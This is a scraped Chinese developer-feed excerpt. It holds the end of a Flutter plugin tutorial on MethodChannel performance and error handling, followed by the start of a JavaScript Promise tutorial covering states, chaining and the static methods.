  <span class="hljs-keyword">await</span> _channel.invokeMethod(<span class="hljs-string">'saveName'</span>, user.name);
  <span class="hljs-keyword">await</span> _channel.invokeMethod(<span class="hljs-string">'saveAge'</span>, user.age);
  <span class="hljs-keyword">await</span> _channel.invokeMethod(<span class="hljs-string">'saveEmail'</span>, user.email);
}

<span class="hljs-comment">// 推荐</span>
Future&lt;<span class="hljs-keyword">void</span>&gt; saveUser(User user) <span class="hljs-keyword">async</span> {
  <span class="hljs-keyword">await</span> _channel.invokeMethod(<span class="hljs-string">'saveUser'</span>, {
    <span class="hljs-string">'name'</span>: user.name,
    <span class="hljs-string">'age'</span>: user.age,
    <span class="hljs-string">'email'</span>: user.email,
  });
}
</code></pre>
<h5 data-id="heading-37">2. 使用Isolate处理耗时任务</h5>
<pre><code class="hljs language-dart" lang="dart">Future&lt;<span class="hljs-keyword">void</span>&gt; processLargeData(<span class="hljs-built_in">List</span>&lt;<span class="hljs-built_in">dynamic</span>&gt; data) <span class="hljs-keyword">async</span> {
  <span class="hljs-comment">// 在Isolate中处理，避免阻塞UI</span>
  <span class="hljs-keyword">final</span> result = <span class="hljs-keyword">await</span> compute(_processInIsolate, data);
  <span class="hljs-keyword">await</span> _channel.invokeMethod(<span class="hljs-string">'saveResult'</span>, result);
}

<span class="hljs-keyword">static</span> <span class="hljs-built_in">List</span>&lt;<span class="hljs-built_in">dynamic</span>&gt; _processInIsolate(<span class="hljs-built_in">List</span>&lt;<span class="hljs-built_in">dynamic</span>&gt; data) {
  <span class="hljs-comment">// 耗时处理逻辑</span>
  <span class="hljs-keyword">return</span> processedData;
}
</code></pre>
<h5 data-id="heading-38">3. 内存管理</h5>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// Android侧：及时释放资源</span>
<span class="hljs-keyword">override</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">onDetachedFromEngine</span><span class="hljs-params">(binding: <span class="hljs-type">FlutterPlugin</span>.<span class="hljs-type">FlutterPluginBinding</span>)</span></span> {
    methodChannel.setMethodCallHandler(<span class="hljs-literal">null</span>)
    eventSink?.endOfStream()
    eventSink = <span class="hljs-literal">null</span>
}
</code></pre>
<h4 data-id="heading-39">6.2 错误处理</h4>
<h5 data-id="heading-40">1. 统一的错误处理</h5>
<pre><code class="hljs language-dart" lang="dart"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">PluginError</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">Exception</span> </span>{
  <span class="hljs-keyword">final</span> <span class="hljs-built_in">String</span> code;
  <span class="hljs-keyword">final</span> <span class="hljs-built_in">String</span> message;
  <span class="hljs-keyword">final</span> <span class="hljs-built_in">dynamic</span> details;
  
  PluginError({
    <span class="hljs-keyword">required</span> <span class="hljs-keyword">this</span>.code,
    <span class="hljs-keyword">required</span> <span class="hljs-keyword">this</span>.message,
    <span class="hljs-keyword">this</span>.details,
  });
  
  <span class="hljs-meta">@override</span>
  <span class="hljs-built_in">String</span> toString() =&gt; <span class="hljs-string">'PluginError(<span class="hljs-subst">$code</span>): <span class="hljs-subst">$message</span>'</span>;
}

Future&lt;T&gt; safeInvoke&lt;T&gt;(<span class="hljs-built_in">String</span> method, [<span class="hljs-built_in">dynamic</span> arguments]) <span class="hljs-keyword">async</span> {
  <span class="hljs-keyword">try</span> {
    <span class="hljs-keyword">final</span> result = <span class="hljs-keyword">await</span> _channel.invokeMethod(method, arguments);
    <span class="hljs-keyword">return</span> result <span class="hljs-keyword">as</span> T;
  } <span class="hljs-keyword">on</span> PlatformException <span class="hljs-keyword">catch</span> (e) {
    <span class="hljs-keyword">throw</span> PluginError(
      code: e.code,
      message: e.message ?? <span class="hljs-string">'Unknown error'</span>,
      details: e.details,
    );
  } <span class="hljs-keyword">catch</span> (e) {
    <span class="hljs-keyword">throw</span> PluginError(
      code: <span class="hljs-string">'UNKNOWN'</span>,
      message: e.toString(),
      details: e,
    );
  }
}
</code></pre>
<pre><code class="hljs language-csharp" lang="csharp">
<span class="hljs-meta">### 6.3 平台差异处理策略</span>

<span class="hljs-meta">#### 1. 功能检测与降级</span>
```dart
<span class="hljs-keyword">class</span> <span class="hljs-title">PlatformFeatureDetector</span> {
  <span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-title">Future</span>&lt;<span class="hljs-title">bool</span>&gt; <span class="hljs-title">isFeatureAvailable</span>(<span class="hljs-params">String feature</span>) <span class="hljs-keyword">async</span></span> {
    <span class="hljs-keyword">try</span> {
      <span class="hljs-keyword">return</span> <span class="hljs-keyword">await</span> _channel.invokeMethod(<span class="hljs-string">'checkFeature'</span>, feature);
    } <span class="hljs-keyword">on</span> PlatformException {
      <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
    }
  }
  
  <span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-title">Future</span>&lt;<span class="hljs-title">T</span>&gt; <span class="hljs-title">withFallback</span>&lt;<span class="hljs-title">T</span>&gt;(<span class="hljs-params">{
    required Future&lt;T&gt; Function(</span>) primary,
    required Future&lt;T&gt; <span class="hljs-title">Function</span>() fallback,
    String? feature,
  }) <span class="hljs-keyword">async</span></span> {
    <span class="hljs-keyword">if</span> (feature != <span class="hljs-literal">null</span> &amp;&amp; !<span class="hljs-keyword">await</span> isFeatureAvailable(feature)) {
      <span class="hljs-keyword">return</span> <span class="hljs-keyword">await</span> fallback();
    }
    
    <span class="hljs-keyword">try</span> {
      <span class="hljs-keyword">return</span> <span class="hljs-keyword">await</span> primary();
    } <span class="hljs-keyword">catch</span> (e) {
      PluginLogger.error(<span class="hljs-string">'Primary method failed'</span>, e);
      <span class="hljs-keyword">return</span> <span class="hljs-keyword">await</span> fallback();
    }
  }
}
</code></pre>
<h5 data-id="heading-41">2. 条件编译</h5>
<pre><code class="hljs language-dart" lang="dart"><span class="hljs-comment">// 使用条件导入处理平台差异</span>
<span class="hljs-keyword">export</span> <span class="hljs-string">'src/network_plugin_interface.dart'</span>;

<span class="hljs-comment">// 在platform目录下</span>
<span class="hljs-comment">// network_plugin_android.dart</span>
<span class="hljs-comment">// network_plugin_ios.dart</span>
<span class="hljs-comment">// network_plugin_web.dart</span>
</code></pre>
<h3 data-id="heading-42">总结</h3>
<p>至此，Flutter的插件开发以及如何与Android/iOS进行原生交互就全部介绍完了，我们掌握了如下知识点：</p>
<ul>
<li><strong>Platform Channel原理-Flutter与原生平台通信的底层机制</strong></li>
<li><strong>MethodChannel使用-双向方法调用的实现</strong></li>
<li><strong>EventChannel-原生到Dart的数据流传输</strong></li>
<li><strong>自定义插件开发完整流程</strong></li>
<li><strong>处理Android/iOS的差异</strong></li>
<li><strong>提升插件性能的技巧</strong></li>
</ul>
<p>插件开发是Flutter开发的重要技能，能够帮助我们深入理解Flutter架构，充分利用各平台的能力。遇到问题时，多查阅官方文档，多调试。</p>
<hr/>
<p><strong>如果这篇文章对你有帮助，别忘了一键三连~~~，有任何问题或建议，欢迎在评论区留言讨论。下期见！</strong></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[深入理解JavaScript Promise：异步编程的基石]]></title>    <link>https://juejin.cn/post/7579886397074669568</link>    <guid>https://juejin.cn/post/7579886397074669568</guid>    <pubDate>2025-12-05T03:15:02.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7579886397074669568" data-draft-id="7579887768227414050" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="深入理解JavaScript Promise：异步编程的基石"/> <meta itemprop="keywords" content="前端,JavaScript"/> <meta itemprop="datePublished" content="2025-12-05T03:15:02.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="少寒"/> <meta itemprop="url" content="https://juejin.cn/user/976811508112392"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            深入理解JavaScript Promise：异步编程的基石
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/976811508112392/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    少寒
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-05T03:15:02.000Z" title="Fri Dec 05 2025 03:15:02 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-05
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读9分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>在JavaScript的异步编程世界里，Promise无疑是里程碑式的存在。它彻底解决了传统回调函数嵌套带来的“回调地狱”问题，让异步代码的逻辑更清晰、更具可读性和可维护性。本文将从Promise的核心概念出发，逐步剖析其工作原理、常用方法及实际应用场景，帮助你真正掌握这一异步编程利器。</p>
<h2 data-id="heading-0">一、为什么需要Promise？—— 从回调地狱说起</h2>
<p>在Promise出现之前，JavaScript处理异步操作（如网络请求、文件读取、定时器等）主要依赖回调函数。当多个异步操作存在依赖关系时，就需要将一个回调函数嵌套在另一个回调函数内部，形成层层嵌套的结构，这就是常说的“回调地狱”（Callback Hell）。</p>
<p>示例：回调地狱的困境</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 模拟获取用户信息</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">getUserInfo</span>(<span class="hljs-params">userId, callback</span>) {
  <span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">() =&gt;</span> {
    <span class="hljs-title function_">callback</span>(<span class="hljs-literal">null</span>, { <span class="hljs-attr">userId</span>: userId, <span class="hljs-attr">userName</span>: <span class="hljs-string">"张三"</span> });
  }, <span class="hljs-number">1000</span>);
}

<span class="hljs-comment">// 模拟根据用户信息获取订单</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">getOrders</span>(<span class="hljs-params">userInfo, callback</span>) {
  <span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">() =&gt;</span> {
    <span class="hljs-title function_">callback</span>(<span class="hljs-literal">null</span>, [{ <span class="hljs-attr">orderId</span>: <span class="hljs-number">1</span>, <span class="hljs-attr">goods</span>: <span class="hljs-string">"手机"</span> }, { <span class="hljs-attr">orderId</span>: <span class="hljs-number">2</span>, <span class="hljs-attr">goods</span>: <span class="hljs-string">"电脑"</span> }]);
  }, <span class="hljs-number">1000</span>);
}

<span class="hljs-comment">// 模拟根据订单获取物流信息</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">getLogistics</span>(<span class="hljs-params">order, callback</span>) {
  <span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">() =&gt;</span> {
    <span class="hljs-title function_">callback</span>(<span class="hljs-literal">null</span>, { <span class="hljs-attr">logisticsId</span>: <span class="hljs-number">1001</span>, <span class="hljs-attr">status</span>: <span class="hljs-string">"已发货"</span> });
  }, <span class="hljs-number">1000</span>);
}

<span class="hljs-comment">// 层层嵌套的回调地狱</span>
<span class="hljs-title function_">getUserInfo</span>(<span class="hljs-number">1</span>, <span class="hljs-function">(<span class="hljs-params">err, userInfo</span>) =&gt;</span> {
  <span class="hljs-keyword">if</span> (err) <span class="hljs-keyword">throw</span> err;
  <span class="hljs-title function_">getOrders</span>(userInfo, <span class="hljs-function">(<span class="hljs-params">err, orders</span>) =&gt;</span> {
    <span class="hljs-keyword">if</span> (err) <span class="hljs-keyword">throw</span> err;
    <span class="hljs-title function_">getLogistics</span>(orders[<span class="hljs-number">0</span>], <span class="hljs-function">(<span class="hljs-params">err, logistics</span>) =&gt;</span> {
      <span class="hljs-keyword">if</span> (err) <span class="hljs-keyword">throw</span> err;
      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"物流信息："</span>, logistics);
    });
  });
});
</code></pre>
<p>上述代码中，为了获取第一个订单的物流信息，需要先获取用户信息，再获取订单列表，最后获取物流信息，形成了三层嵌套。这种代码不仅可读性差，而且一旦需要修改逻辑或排查错误，都极为困难。Promise的出现，正是为了打破这种嵌套困境，让异步代码能够像同步代码一样线性书写。</p>
<h2 data-id="heading-1">二、Promise的核心概念：状态与结果</h2>
<p>Promise是一个构造函数，用于创建表示异步操作最终完成（或失败）及其结果值的对象。其核心特征是<strong>状态不可逆</strong>，这是理解Promise的关键。</p>
<h3 data-id="heading-2">2.1 三种状态</h3>
<p>一个Promise对象从创建到结束，会经历以下三种状态之一，且状态一旦改变，就会永久保持该状态，不会再发生变化：</p>
<ul>
<li><strong>pending（等待中）</strong> ：初始状态，既不是成功也不是失败。此时异步操作正在进行中。</li>
<li><strong>fulfilled（已成功）</strong> ：异步操作顺利完成，Promise对象会接收一个“成功结果”。</li>
<li><strong>rejected（已失败）</strong> ：异步操作失败，Promise对象会接收一个“失败原因”（通常是错误对象）。</li>
</ul>
<p>状态的转换只有两种可能：从pending转为fulfilled，或从pending转为rejected。不存在fulfilled与rejected之间的相互转换，也不存在从终态转回pending的情况。</p>
<h3 data-id="heading-3">2.2 结果值</h3>
<p>与状态对应的是Promise的结果值，分为两种：</p>
<ul>
<li><strong>成功结果（value）</strong> ：当状态从pending转为fulfilled时，会携带该值，可通过<code>then</code>方法获取。</li>
<li><strong>失败原因（reason）</strong> ：当状态从pending转为rejected时，会携带该原因，可通过<code>catch</code>方法获取。</li>
</ul>
<h2 data-id="heading-4">三、Promise的基本使用：创建与调用</h2>
<p>要使用Promise，首先需要通过<code>new Promise()</code>创建Promise实例，再通过<code>then</code>和<code>catch</code>方法处理异步结果。</p>
<h3 data-id="heading-5">3.1 创建Promise实例</h3>
<p>Promise构造函数接收一个<strong>执行器函数（executor）</strong> 作为参数，该函数会在创建Promise实例时立即执行。执行器函数又接收两个参数：<code>resolve</code>和<code>reject</code>，它们都是由JavaScript引擎提供的函数，用于改变Promise的状态。</p>
<ul>
<li><code>resolve(value)</code>：将Promise状态从pending转为fulfilled，并将成功结果value传递出去。</li>
<li><code>reject(reason)</code>：将Promise状态从pending转为rejected，并将失败原因reason传递出去。</li>
</ul>
<p>示例：创建Promise实例模拟异步操作</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 模拟获取用户信息的Promise版本</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">getUserInfo</span>(<span class="hljs-params">userId</span>) {
  <span class="hljs-comment">// 返回一个Promise实例</span>
  <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Promise</span>(<span class="hljs-function">(<span class="hljs-params">resolve, reject</span>) =&gt;</span> {
    <span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">() =&gt;</span> {
      <span class="hljs-comment">// 模拟成功场景：调用resolve传递结果</span>
      <span class="hljs-title function_">resolve</span>({ <span class="hljs-attr">userId</span>: userId, <span class="hljs-attr">userName</span>: <span class="hljs-string">"张三"</span> });
      <span class="hljs-comment">// 模拟失败场景：调用reject传递错误</span>
      <span class="hljs-comment">// reject(new Error("获取用户信息失败"));</span>
    }, <span class="hljs-number">1000</span>);
  });
}
</code></pre>
<h3 data-id="heading-6">3.2 处理Promise结果：then与catch</h3>
<p>Promise实例创建后，需要通过<code>then</code>方法处理成功结果，通过<code>catch</code>方法处理失败原因。此外，<code>finally</code>方法用于指定无论Promise状态如何都会执行的回调函数。</p>
<p>示例：使用then、catch、finally处理Promise</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-title function_">getUserInfo</span>(<span class="hljs-number">1</span>)
  .<span class="hljs-title function_">then</span>(<span class="hljs-function">(<span class="hljs-params">userInfo</span>) =&gt;</span> {
    <span class="hljs-comment">// 处理成功结果</span>
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"用户信息："</span>, userInfo);
    <span class="hljs-comment">// 可以返回一个新的Promise，实现链式调用</span>
    <span class="hljs-keyword">return</span> <span class="hljs-title function_">getOrders</span>(userInfo); <span class="hljs-comment">// 假设getOrders已改为Promise版本</span>
  })
  .<span class="hljs-title function_">then</span>(<span class="hljs-function">(<span class="hljs-params">orders</span>) =&gt;</span> {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"订单列表："</span>, orders);
    <span class="hljs-keyword">return</span> <span class="hljs-title function_">getLogistics</span>(orders[<span class="hljs-number">0</span>]); <span class="hljs-comment">// 假设getLogistics已改为Promise版本</span>
  })
  .<span class="hljs-title function_">then</span>(<span class="hljs-function">(<span class="hljs-params">logistics</span>) =&gt;</span> {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"物流信息："</span>, logistics);
  })
  .<span class="hljs-title function_">catch</span>(<span class="hljs-function">(<span class="hljs-params">err</span>) =&gt;</span> {
    <span class="hljs-comment">// 统一处理所有异步操作的错误</span>
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">"出错了："</span>, err.<span class="hljs-property">message</span>);
  })
  .<span class="hljs-title function_">finally</span>(<span class="hljs-function">() =&gt;</span> {
    <span class="hljs-comment">// 无论成功或失败，都会执行（如关闭加载动画）</span>
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"异步操作结束"</span>);
  });
</code></pre>
<p>上述代码通过<code>then</code>的链式调用，将原本嵌套的异步逻辑改为线性结构，可读性大幅提升。值得注意的是，<code>then</code>方法会返回一个新的Promise实例，这是实现链式调用的核心原因。如果在<code>then</code>的回调函数中返回一个值，该值会被包装成一个状态为fulfilled的Promise；如果返回一个Promise实例，则新Promise的状态由该实例决定。</p>
<h2 data-id="heading-7">四、Promise的常用静态方法</h2>
<p>除了实例方法，Promise还提供了多个静态方法，用于处理多个异步操作的场景，极大提升了异步编程的灵活性。</p>
<h3 data-id="heading-8">4.1 Promise.all(iterable)</h3>
<p>接收一个可迭代对象（如数组），该对象中的每个元素都是Promise实例。其特性如下：</p>
<ul>
<li>只有当<strong>所有</strong>Promise实例都变为fulfilled状态时，返回的新Promise才会变为fulfilled，结果是一个包含所有成功结果的数组，顺序与传入的Promise顺序一致。</li>
<li>只要有<strong>一个</strong>Promise实例变为rejected状态，返回的新Promise就会立即变为rejected，结果是该失败Promise的失败原因。</li>
</ul>
<p>适用场景：需要等待多个独立的异步操作全部完成后，再执行后续逻辑（如同时加载多个资源）。</p>
<p>示例：使用Promise.all处理多个异步操作</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 模拟三个独立的异步请求</span>
<span class="hljs-keyword">const</span> request1 = <span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">resolve</span>(<span class="hljs-string">"请求1成功"</span>);
<span class="hljs-keyword">const</span> request2 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Promise</span>(<span class="hljs-function">(<span class="hljs-params">resolve</span>) =&gt;</span> <span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">() =&gt;</span> <span class="hljs-title function_">resolve</span>(<span class="hljs-string">"请求2成功"</span>), <span class="hljs-number">1000</span>));
<span class="hljs-keyword">const</span> request3 = <span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">resolve</span>(<span class="hljs-string">"请求3成功"</span>);

<span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">all</span>([request1, request2, request3])
  .<span class="hljs-title function_">then</span>(<span class="hljs-function">(<span class="hljs-params">results</span>) =&gt;</span> {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"所有请求成功："</span>, results); <span class="hljs-comment">// ["请求1成功", "请求2成功", "请求3成功"]</span>
  })
  .<span class="hljs-title function_">catch</span>(<span class="hljs-function">(<span class="hljs-params">err</span>) =&gt;</span> {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">"某个请求失败："</span>, err);
  });
</code></pre>
<h3 data-id="heading-9">4.2 Promise.race(iterable)</h3>
<p>同样接收一个可迭代对象，其特性与<code>Promise.all</code>相反：</p>
<ul>
<li>只要有<strong>一个</strong>Promise实例的状态发生改变（无论是fulfilled还是rejected），返回的新Promise就会立即变为相同的状态，结果为该Promise的结果。</li>
</ul>
<p>适用场景：设置异步操作的超时时间（如请求接口时，如果超过5秒未响应则提示超时）。</p>
<p>示例：使用Promise.race实现超时控制</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 模拟接口请求</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">fetchData</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Promise</span>(<span class="hljs-function">(<span class="hljs-params">resolve</span>) =&gt;</span> {
    <span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">() =&gt;</span> <span class="hljs-title function_">resolve</span>(<span class="hljs-string">"接口数据返回"</span>), <span class="hljs-number">3000</span>);
  });
}

<span class="hljs-comment">// 模拟超时</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">timeout</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Promise</span>(<span class="hljs-function">(<span class="hljs-params">resolve, reject</span>) =&gt;</span> {
    <span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">() =&gt;</span> <span class="hljs-title function_">reject</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">"请求超时（2秒）"</span>)), <span class="hljs-number">2000</span>);
  });
}

<span class="hljs-comment">// 谁先改变状态就取谁的结果</span>
<span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">race</span>([<span class="hljs-title function_">fetchData</span>(), <span class="hljs-title function_">timeout</span>()])
  .<span class="hljs-title function_">then</span>(<span class="hljs-function">(<span class="hljs-params">data</span>) =&gt;</span> {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"成功："</span>, data);
  })
  .<span class="hljs-title function_">catch</span>(<span class="hljs-function">(<span class="hljs-params">err</span>) =&gt;</span> {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">"失败："</span>, err.<span class="hljs-property">message</span>); <span class="hljs-comment">// 输出"请求超时（2秒）"</span>
  });
</code></pre>
<h3 data-id="heading-10">4.3 Promise.allSettled(iterable)</h3>
<p>接收一个可迭代对象，等待所有Promise实例都变为终态（fulfilled或rejected）后，返回的新Promise才会变为fulfilled，结果是一个包含每个Promise结果的数组。每个结果对象包含两个属性：</p>
<ul>
<li><code>status</code>：字符串，值为"fulfilled"或"rejected"。</li>
<li><code>value</code>：当status为"fulfilled"时存在，为成功结果。</li>
<li><code>reason</code>：当status为"rejected"时存在，为失败原因。</li>
</ul>
<p>适用场景：需要获取所有异步操作的结果（无论成功或失败），如批量上传文件后，显示每个文件的上传状态。</p>
<h3 data-id="heading-11">4.4 Promise.resolve(value)与Promise.reject(reason)</h3>
<ul>
<li><code>Promise.resolve(value)</code>：快速创建一个状态为fulfilled的Promise实例，结果为value。如果value本身是一个Promise实例，则直接返回该实例。</li>
<li><code>Promise.reject(reason)</code>：快速创建一个状态为rejected的Promise实例，原因是reason。</li>
</ul>
<p>适用场景：将现有值或回调函数转换为Promise，实现接口统一。</p>
<h2 data-id="heading-12">五、Promise的实际应用场景</h2>
<p>Promise在实际开发中应用广泛，以下是几个典型场景：</p>
<h3 data-id="heading-13">5.1 处理网络请求</h3>
<p>前端开发中，网络请求（如使用fetch或axios）是最常见的异步操作，而axios本身就返回Promise实例，fetch也可以通过简单封装转为Promise使用。</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 使用axios发送请求（axios默认返回Promise）</span>
<span class="hljs-keyword">import</span> axios <span class="hljs-keyword">from</span> <span class="hljs-string">"axios"</span>;

axios.<span class="hljs-title function_">get</span>(<span class="hljs-string">"https://api.example.com/users/1"</span>)
